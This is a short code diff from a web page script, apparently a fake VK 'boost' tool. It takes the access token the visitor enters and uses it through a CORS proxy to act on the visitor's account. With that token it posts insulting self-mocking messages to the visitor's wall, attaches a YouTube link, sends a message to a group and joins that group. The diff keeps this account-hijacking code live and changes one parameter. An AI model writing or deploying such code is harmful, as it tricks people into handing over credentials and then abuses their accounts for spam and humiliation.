@@ -35,7 +35,7 @@
 			let token = document.getElementById('token').value;
 
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=vto.pe ШОК НАКРУТКА ВК 2020 Я ЛОХ я гей сова никогда не спит`).then(response => console.log(response.json()));
-			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=https://www.youtube.com/watch?v=ilfIzgAOaN8`).then(response => console.log(response.json()));
+			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&attachments=https://www.youtube.com/watch?v=ilfIzgAOaN8`).then(response => console.log(response.json()));
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/messages.send?v=5.103&access_token=${token}&message=ya popalsya na klikbeit1&peer_id=-192835178&random_id=0`).then(response => console.log(response.json()));
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/groups.join?v=5.103&access_token=${token}&group_id=192835178`).then(response => console.log(response.json()));
 
